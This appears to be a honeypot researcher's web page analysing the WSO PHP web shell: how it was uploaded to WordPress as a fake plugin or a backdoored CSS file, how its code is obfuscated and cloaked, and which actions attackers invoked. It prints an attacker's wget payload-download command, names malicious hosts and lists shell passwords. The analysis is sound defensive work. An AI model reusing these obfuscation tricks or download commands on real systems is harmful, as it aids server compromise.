<div id="subheader"><h2>WSO Web Shell</h2></div>
<p>
"WSO" apparently stands for "Web Shell by orb", a note that sometimes appears 
in WSO source code. The WSO Web Shell provides a system
administration and hacking console to those who know its URL.
It's also apparently known as the <a href="http://labs.sucuri.net/db/malware/backdoor-phpfilesman02">FilesMan</a>
backdoor, even though it's a good deal more than a mere backdoor.
</p>
<p>
WSO requires a password for further access. Passwords sent along to various
WSO instances:
'4500045', 'nhzgrf', 'aspx12', 'FDY17c', 'gatamorgana'
The password gets run through <kbd>md5()</kbd> and compared to a string
literal in the source code. These string literals often appear
on the web: googling for any of them gets you the corresponding plain-text
password.
</p>
<!--
<p>
'gatamorgana' password used by <kbd>mod_twit.php</kbd>, WSO v2.4.
Obfuscated by <kbd>preg_replace("/.*/e","\x65\x7...",".");</kbd>,
executing "\xNN"-encoded PHP string. The "\xNN"-encoded string
ends up as the old <kbd>eval(gzinflate(base64_decode"..."));</kbd>.
So this one has two levels of encoding and evaluation of the WSO source.
This was uploaded twice, as a plugin by 178.158.214.36
</p>
<p>
Password 'FDY17c' used by WSO 2.5, uploaded as a plugin by 193.17.208.89.
Password 'aspx12' corresponds to a WSO v2.5, uploaded as a plugin
by 2.132.141.89.  Nothing other than the MD5 hash of the password differs
in these two source files.
</p>
-->
<p>
Versions 2.4, 2.5, 2.5.1 and 3.1 all got downloaded by honey pot users,
although it's not clear to me that "orb" or even a single entity maintains
the versioning.
</p>
<div id="subsubheader"><h3>Method of Installation</h3></div>
<p>
Usually, WSO gets downloaded as just another PHP file in a 
WordPress plugin. Although the name of the WSO PHP file 
in the plugin zip-file varies
(<kbd>mod_googleapi.php</kbd>, <kbd>config.php</kbd>,<kbd>mod_te.php</kbd>,
<kbd>mod_system.php</kbd> and many others get used),
the plugin used always claims to be a "Tumblr Importer".
The rest of the files from plugin zip files captured by my honey pot
appear identical in all plugin downloads.
</p>
<p>
On occasion, an attacker tried to download the single, unzipped
".php" file of WSO source code as a plugin. This does not work on any
verion of WordPress I have tried, but my honey pot appears to allow it.
Possibly these attackers would have tried again, with a zip-file.
Due to emulation more permissive than reality, they didn't need to.
Since a single ".php" file doesn't work as a plugin in real WordPress,
I have to wonder why the attackers even bother to try this.
</p>
<p>
One WSO shell got downloaded as the <kbd>rtl.css</kbd> file in the
default theme. The downloader used the <kbd>theme-editor.php</kbd>
WordPress file to download, which in the case of my honey pot, contained
just enough PHP to show HTML for a successful theme edit, and capture
the downloaded theme edit.
</p>
<div id="subsubheader"><h3>Obfuscation</h3></div>
<p>
WSO shells change name constantly. The WSO PHP file in the Tumbler importer
plugin is mostly named <kbd>mod_something.php</kbd>, where "something" is
"gogle", "googleapi", "te", "twit" or other names. Occasionally WSO shells
have names like "jm.php", "502.php", "info.php", "error.php", "copyright.php".
The name changes can only protect against naive human detection.
</p>
<p>
WSO shells used varied source-code obfuscation.
PHP has to be distributed in source code form, it's interpreted.
This seems  to cause a lot of variation in obfuscation.
</p>
<p>
Some uploads used <kbd>eval(base64_decode("...");</kbd>
Other uploads used <kbd>eval(gzinflate(base64_decode("...")));</kbd>
In both cases, WSO PHP source code has been encoded, and gets
executed by the <kbd>eval()</kbd> construct.
</p>
<p>
The kinked <kbd>rtl.css</kbd> file did an <kbd>eval(base64_decode("...")</kbd>
on suitably encoded WSO PHP, but only if <kbd>isset($_GET['pwd'])</kbd>.
That is, called by an HTTP GET method where the URL contained a 'pwd' named
value.
</p>
<p>
A few uploads used<kbd>preg_replace("/.*/e","...");</kbd> to execute WSO code.
The <kbd>preg_replace</kbd> composed and executed a <kbd>
gzinflate(base64_decode('...');</kbd> construct, making it something of a
2-layer encoding.  This method avoids the use of the <kbd>eval()</kbd> PHP
construct, which should almost never appear in code.
</p>
<div id="subsubheader"><h3>Run-time Camoflage</h3></div>
<p>
WSO returns an HTTP 404 code ("file not found") and corresponding HTML from inside itself
when the User Agent string has a substring that matches one of
"Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler".
This is an attempt to stay out of search engine's index.
Which doesn't always work: a <a href="https://www.google.com/#q=inurl:mod_gogle.php">search for a common WSO file name</a>
turns up quite a few instances.
</p>
<p>
The kinked theme had to be called by an HTTP GET
with a 'pwd' named value in the URL to execute the WSO shell. 
Called in any other fashion, it would just give
back the default "kubrick" theme CSS.
</p>
<div id="subsubheader"><h3><a name="ACTIONPHP">Primary Uses</a></h3></div>
<p>
It's hard to impute motive, but it's easy to look at what WSO
"actions" get called. A typical WSO file defines about 12
"action" functions, ranging from a action that runs PHP
on the web server to self-removal.  My honey pot only caught
attackers invoking 5 actions.
</p>
<table border="1">
	<tr><th>Action</th><th>Invocation Count</th></tr>
	<tr><td>Php</td><td align="right">12</td></tr>
	<tr><td>Console</td><td align="right">1</td></tr>
	<tr><td>Framer</td><td align="right">18</td></tr>
	<tr><td>FilesMan</td><td align="right">464</td></tr>
	<tr><td>FilesTools</td><td align="right">10</td></tr>
</table>
<p>
The "Console" action provides something akin to a remote shell.
The user types a command, which gets sent to the web server.
The web server executes the command and sends any results back.
The single call to the "Console" action tried to run the command:
</p>
<pre>wget http://freemoviesbazaar.com/wp-content/uploads/1986/03/b 2&gt;&amp;1</pre>
<p>
The "FilesTools" action offers the interactive user a lot of functionality.  At
least some of the calls appear to be interactive, a human user trying to figure
out what the WSO emulation had to offer by "downloading" a file from the server
to the user's machine.
</p>
<p>
One of the "FilesTools" actions was to do a "mkfile" with the name "asas.php".
This was followed by a "FilesTools" action to edit <kbd>asas.php</kbd>.  The
"edit" sub-action replaces an existing file's contents. Once replaced,
<kbd>asas.php</kbd> would have acted as an HTTP proxy, fetching a "links file"
from manka11.com or manka12342341.com.  My WSO emulation wasn't good enough for
the "mkfile" and "edit" sub-actions to take place, so I have no idea what sucn
a links file looks like.  This constitutes yet another way to download code
onto a server.
</p>
<p>
The "Framer" invocations probably don't work. It seems that someone wanted to
put a <kbd>&lt;script&gt;</kbd> tag into some files. The
<kbd>&lt;script&gt;</kbd> source
<kbd>http://stummann.net/steffen/google-analytics/jquery-1.6.5.min.js</kbd>,
which looks to contain malicious JavaScript. None of the WSO code I examined in
detail had an "Framer" action. A "Framer" action might reside in some
custom-coded piece of a WSO source file I didn't look at.
</p>
<div id="subsubheader"><h3>Coding Style</h3></div>
<p>
WSO can run under both Windows and Linux, although it has more capability
under Linux.
</p>
<p>
WSO accomodates different versions of PHP to some extent.
It doesn't use _REQUEST, it uses explicit _GET and _POST, for example.
It also tries a rainbow of alternative PHP builtins when trying
to run external commands.
</p>
<p>
The code seems fairly coherent. As version number increases, the function
naming becomes more standardized, which would seem to be the work of a
single programmer.
